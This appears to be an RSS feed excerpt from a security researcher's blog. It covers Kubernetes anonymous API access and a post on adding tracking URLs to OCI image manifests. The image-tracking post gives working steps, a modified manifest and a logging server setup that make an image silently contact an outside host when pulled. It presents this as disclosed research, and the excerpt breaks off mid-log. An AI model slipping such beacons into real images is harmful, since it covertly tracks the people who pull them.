&lt;p&gt;When looking at Kubernetes authorization it can be tempting to focus purely on RBAC as it’s the most common option deployed in Kubernetes clusters today. However as we’ve seen there are times when RBAC alone won’t provide an adequate level of security and supplemental authorization modes and admission controllers are required. In this post we’ve looked at the Node authorization mode and NodeRestriction admission controller which are used to provide rights to Kubelets to access the resources they need to function.&lt;/p&gt;

</description>
				<pubDate>Sat, 08 Apr 2023 15:27:00 +0100</pubDate>
				<link>https://raesene.github.io/blog/2023/04/08/lets-talk-about-kubelet-authorization/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2023/04/08/lets-talk-about-kubelet-authorization/</guid>
			</item>
		
			<item>
				<title>Let's talk about anonymous access to Kubernetes</title>
				<description>&lt;p&gt;This week there were some articles about the &lt;a href=&quot;https://www.bleepingcomputer.com/news/security/first-known-dero-cryptojacking-operation-seen-targeting-kubernetes/&quot;&gt;Dero Cryptojacking operation&lt;/a&gt; and one of the details about what the attackers did caught my eye. It was mentioned that they were attacking clusters that allowed anonymous access to the Kubernetes API. Exactly how and why anonymous access is possible to Kubernetes is kind of an interesting topic that touches on a few different areas, so I thought I’d write a bit about it.&lt;/p&gt;

&lt;h2 id=&quot;how-does-anonymous-access-work&quot;&gt;How does anonymous access work?&lt;/h2&gt;

&lt;p&gt;Whether anonymous access works on a cluster is controlled by a flag on the &lt;a href=&quot;https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/&quot;&gt;kube-apiserver&lt;/a&gt; component. The flag is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--anonymous-auth&lt;/code&gt; and it defaults to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;, so if you don’t see it in the list of parameters passed to the server anonymous access will be enabled.&lt;/p&gt;

&lt;p&gt;However on it’s own that won’t actually give attackers a lot of access to the cluster, as it only covers one of the three gates a request passes through before it’s processed. As shown in the Kubernetes docs &lt;a href=&quot;https://kubernetes.io/docs/concepts/security/controlling-access/&quot;&gt;controlling access&lt;/a&gt; section after authentication, the request then has to pass authorization and admission control.&lt;/p&gt;

&lt;h2 id=&quot;authorization-and-anonymous-access&quot;&gt;Authorization and anonymous access&lt;/h2&gt;

&lt;p&gt;So the next step is that a request will need to match an authorization policy (typically RBAC, but possibly others as well). Of course in order to do that the request has to be assigned to an identity, and that’s where the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:anonymous&lt;/code&gt; user and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:unauthenticated&lt;/code&gt; group come in. These identities are assigned to any request that doesn’t have a valid authentication token, and are used to match against authorization policies.&lt;/p&gt;

&lt;p&gt;You can see this in action by looking at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:public-info-viewer&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrolebinding&lt;/code&gt; on a Kubeadm cluster.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io/v1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterRoleBinding&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;annotations&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;rbac.authorization.kubernetes.io/autoupdate&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;true&quot;&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;kubernetes.io/bootstrapping&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac-defaults&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;system:public-info-viewer&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;roleRef&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;apiGroup&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterRole&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;system:public-info-viewer&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;subjects&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;apiGroup&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Group&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;system:authenticated&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;apiGroup&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Group&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;system:unauthenticated&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;anonymous-access-in-the-wild&quot;&gt;Anonymous access in the wild&lt;/h2&gt;

&lt;p&gt;Now we know how anonymous access works, the question is going to be “how common is this?”. The answer is that most major distributions will enable anonymous access by default and will generally provide access to some limited number of endpoints via the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:public-info-viewer&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrole&lt;/code&gt; which provides access to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/version&lt;/code&gt; endpoint along with a couple of others.&lt;/p&gt;

&lt;p&gt;To get a sense for how many clusters this applies to we can just use &lt;a href=&quot;https://search.censys.io/&quot;&gt;censys&lt;/a&gt; or &lt;a href=&quot;https://www.shodan.io/&quot;&gt;shodan&lt;/a&gt; to look for clusters that return version information. This &lt;a href=&quot;https://search.censys.io/search?resource=hosts&amp;amp;q=services.kubernetes.version_info.git_version%3D%22*%22&quot;&gt;censys query&lt;/a&gt; for example shows just over one million hosts that return version information, so we can say that it’s a fairly common configuration.&lt;/p&gt;

&lt;p&gt;A more serious question, which corresponds more to the points raised in the dero artice is, how many of these clusters would allow for an attacker to create workloads in them. Whilst you can’t get that exact information from Censys, it does have a query showing clusters that allow for anonymous users to enumerate pods in the cluster which shows &lt;a href=&quot;https://search.censys.io/search?resource=hosts&amp;amp;q=services.kubernetes.pod_names%3D%22*%22&quot;&gt;302 cluster nodes&lt;/a&gt; at time of writing. I’d guess some/most of those are honeypots, but also probably a couple of vulnerable clusters in there.&lt;/p&gt;

&lt;h2 id=&quot;disabling-anonymous-access&quot;&gt;Disabling anonymous access&lt;/h2&gt;

&lt;p&gt;On an unmanaged cluster (e.g. Rancher, Kubespray, Kubeadm) you can disable anonymous access by passing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--anonymous-auth=false&lt;/code&gt; flag to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kube-apiserver&lt;/code&gt; component. On managed clusters (e.g. EKS, GKE, AKS) you can’t do that, however what you can do is remove any RBAC rules which allow anonymous users to perform actions. For example, on a Kubeadm cluster you can remove the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:public-info-viewer&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrolebinding&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:public-info-viewer&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrole&lt;/code&gt; and that effectively stop anonymous users getting information from the cluster.&lt;/p&gt;

&lt;p&gt;Of course, if you have any applications that rely on those endpoints (for example for health checks) they would break, so it’s important to test any changes you make to the cluster. One option here would be to review your audit logs and see if there are any anonymous requests made to the API server.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Allowing some level of anonymous access is a common default in Kubernetes. In and of itself it’s not a great security concern, however it does mean that in many configurations the only thing stopping attackers compromising your cluster is RBAC rules, so a single mistake could cause significant issues, especially if your cluster is exposed to the internet.&lt;/p&gt;
</description>
				<pubDate>Sat, 18 Mar 2023 14:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2023/03/18/lets-talk-about-anonymous-access-to-Kubernetes/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2023/03/18/lets-talk-about-anonymous-access-to-Kubernetes/</guid>
			</item>
		
			<item>
				<title>Fun with Containers - Adding tracking to your images</title>
				<description>&lt;p&gt;Last year I was taking a look at the OCI Image specification and I came across something kind of interesting, which is how you can get a container image to ping a URL when it’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pulled&lt;/code&gt; to a host almost like a tracking cookie. Needless to say this isn’t me dropping 0-day, I reported this to the containerd and podman security addresses back in October 2022 and the consensus appears to be that whilst this may have some security implications it’s not dreadfully serious in most cases and it’s part of the spec, so unlikely to change.&lt;/p&gt;

&lt;p&gt;With that said, it’s an interesting way to investigate a bit about how the OCI spec works and some of the tooling that goes with it, so lets dive in.&lt;/p&gt;

&lt;h2 id=&quot;oci-image-specification&quot;&gt;OCI Image Specification&lt;/h2&gt;

&lt;p&gt;Reading through the &lt;a href=&quot;https://github.com/opencontainers/image-spec/blob/main/spec.md&quot;&gt;OCI Image Specification&lt;/a&gt; like any specification can be a bit hard to reason about as there’s a lot of text there, which you’d expect in a document which has to be precise about what it’s defining. So to help me parse out what was happening I tried to create a mermaid.js diagram of the different elements, which ended up looking like this :-&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/oci-image-spec.png&quot; alt=&quot;OCI Image Mermaid diagram&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the graph, I noticed that several of the sections, including config, manifest, and layers are of type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;descriptor&lt;/code&gt;. Looking at the &lt;a href=&quot;https://github.com/opencontainers/image-spec/blob/main/descriptor.md&quot;&gt;type definition&lt;/a&gt; I saw that there was a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;urls&lt;/code&gt; field which is listed as OPTIONAL. Seeing this made me wonder, what happens if you specify that in a container image?&lt;/p&gt;

&lt;p&gt;At this point I had an experiment to try out, so the next step was to create an image that specifies a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt; parameter…&lt;/p&gt;

&lt;h2 id=&quot;setting-up-the-base-image&quot;&gt;Setting up the base image&lt;/h2&gt;

&lt;p&gt;The first thing to note here is a bit of container image history. Usually if you use &lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; to create images you don’t actually get an OCI specification image, you get a docker format image. Whilst these are generally interoperable, there are som differences which matter for the purpose of this experiment, so we can’t just do what we might usually and use a docker image as a starting point.&lt;/p&gt;

&lt;p&gt;To demonstrate this I created a very simple Dockerfile&lt;/p&gt;

&lt;div class=&quot;language-dockerfile highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; busybox&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; [&quot;/bin/sh&quot;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then built it first with standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker build&lt;/code&gt; and then with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker buildx build -o type=oci&lt;/code&gt; to get an OCI image. Extracting the tarballs for both these shows how the two formats differ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Docker image&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;383fca235ae5442f82b630fed2d6ed8306cc4f6f490e41f56c7fddbdf5f795be.json
5e558067e843bda80c685292e5fcc6d3a1c01cea5f13896cc891d70bc4067e07/
5e558067e843bda80c685292e5fcc6d3a1c01cea5f13896cc891d70bc4067e07/VERSION
5e558067e843bda80c685292e5fcc6d3a1c01cea5f13896cc891d70bc4067e07/json
5e558067e843bda80c685292e5fcc6d3a1c01cea5f13896cc891d70bc4067e07/layer.tar
manifest.json
repositories
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;OCI Image&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;blobs/
blobs/sha256/
blobs/sha256/245c6832cd7a449df9ce7b95d94569329c13fb05ccb38f58f537191b75d258b9
blobs/sha256/c5b5e79770f0f14d204f1bfdda52533a39b140eec9d39c15d165b41af3972feb
blobs/sha256/f5b7ce95afea5d39690afc4c206ee1bf3e3e956dcc8d1ccd05c6613a39c4e4f8
index.json
manifest.json
oci-layout
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we know how to create an OCI image to use we need to modify one of the sections to include our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt; parameter.&lt;/p&gt;

&lt;h2 id=&quot;modifying-the-image&quot;&gt;Modifying the image&lt;/h2&gt;

&lt;p&gt;One of the feature of OCI images is that they use SHA-256 hashes to identify the different elements, so if we modify the contents of a file, we then need to re-compute the hash of the file and update the references to it. What I found was that the easiest section to modify, which has the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt; parameter set, is the manifest layer. So if we get the manifest from our OCI image above we can add a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt; parameter to it like this&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;mediaType&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;application/vnd.oci.image.manifest.v1+json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;schemaVersion&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;config&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;mediaType&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;application/vnd.oci.image.config.v1+json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;digest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sha256:245c6832cd7a449df9ce7b95d94569329c13fb05ccb38f58f537191b75d258b9&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;625&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;urls&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
         &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://logs.pwndland.uk/245c6832cd7a449df9ce7b95d94569329c13fb05ccb38f58f537191b75d258b9&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;layers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
         &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;mediaType&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;application/vnd.oci.image.layer.v1.tar+gzip&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
         &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;digest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sha256:f5b7ce95afea5d39690afc4c206ee1bf3e3e956dcc8d1ccd05c6613a39c4e4f8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
         &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;772998&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I’ve added the URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://logs.pwndland.uk/245c6832cd7a449df9ce7b95d94569329c13fb05ccb38f58f537191b75d258b9&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config&lt;/code&gt; section of the manfiest. This URL includes the SHA-256 hash of the config file, which is important as it’s checked by the OCI runtime when it’s pulled (you can use different urls but you’ll get more errors and less successful pulls that way).&lt;/p&gt;

&lt;p&gt;When we add this change to the manifest we’ve modified the hash of the manifest file, so we need to update this anywhere it appears in the image to make things work. There’s a couple of steps here :-&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sha256sum&lt;/code&gt; on the modified manifest file to get the new hash&lt;/li&gt;
  &lt;li&gt;run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mv [old hash] [new hash]&lt;/code&gt; to rename the file&lt;/li&gt;
  &lt;li&gt;run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stat -c%s [new_manifest_hash_value]&lt;/code&gt; to get the size of the file&lt;/li&gt;
  &lt;li&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.json&lt;/code&gt; update the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;manifests&lt;/code&gt; section to use the new hash and size&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At this point you should have a valid image, so now we just need to upload to a registry to test it.&lt;/p&gt;

&lt;h2 id=&quot;uploading-to-a-registry&quot;&gt;Uploading to a registry&lt;/h2&gt;

&lt;p&gt;The obvious way to do this might be to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar&lt;/code&gt; up the image and then use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker load&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker push&lt;/code&gt; to upload to a registry, however that doesn’t work as the process will modify the image and remove the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt; parameter. So we need to use a different method.&lt;/p&gt;

&lt;p&gt;The best tool I found for doing this without mangling our image, is &lt;a href=&quot;https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md&quot;&gt;crane&lt;/a&gt;. Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crane push&lt;/code&gt; we can upload the directory to our registry without having to create a tarball first.&lt;/p&gt;

&lt;p&gt;In terms of which registries this will work with, I’ve tested Docker Hub, GitHub and Quay.io and they all work (it also works with harbor run locally).&lt;/p&gt;

&lt;h3 id=&quot;running-our-webserver&quot;&gt;Running our webserver&lt;/h3&gt;

&lt;p&gt;To receive the pings from our images being pulled, we need a webserver to receive them. I used Caddy for this as it works pretty well. You can see some general notes about using Caddy that I made &lt;a href=&quot;https://raesene.github.io/blog/2023/01/21/Fun-with-Caddy-SSRF-Testing/&quot;&gt;here&lt;/a&gt;. In this case our Caddyfile can be pretty simple as we just need it to serve files from a directory and log the requests to a file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-caddyfile&quot;&gt;logs.pwndland.uk:80 {
  root * /home/ubuntu/bad_images/hashes
  file_server
  log {
    output file bad_image_access_log.log
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;testing-it-out&quot;&gt;Testing it out&lt;/h3&gt;

&lt;p&gt;So now we have our modified image hosted in a registry, the question is…. does it work? The answer to this turned out to be a little bit varied depending on the tool used to pull the image.&lt;/p&gt;

&lt;p&gt;If we use Docker to pull the image, the pull works and we get no ping back to our webserver.&lt;/p&gt;

&lt;p&gt;If we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nercdctl&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;containerd&lt;/code&gt; we get something like this. You can see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User-agent&lt;/code&gt; header gives us some information about the tool used, you also get the source IP address that pulled it (I’ve redacted in this case as the test’s run from my home network :) )&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;level&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;info&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;ts&quot;&lt;/span&gt;:1676109995.5399737,&lt;span class=&quot;s2&quot;&gt;&quot;logger&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;http.log.access.log6&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;msg&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;handled request&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;request&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;remote_ip&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;[REDACTED]&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;remote_port&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;50758&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;proto&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;HTTP/1.1&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;method&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;host&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;logs.pwndland.uk&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;uri&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;/245c6832cd7a449df9ce7b95d94569329c13fb05ccb38f58f537191b75d258b9&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;headers&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;containerd/1.6.0+unknown&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Accept&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;application/vnd.oci.image.config.v1+json, */*&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;gzip&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]}}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;user_id&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;duration&quot;&lt;/span&gt;:0.000304641,&lt;span class=&quot;s2&quot;&gt;&quot;size&quot;&lt;/span&gt;:625,&lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:200,&lt;span class=&quot;s2&quot;&gt;&quot;resp_headers&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Etag&quot;&lt;/span&gt;:[&lt;span 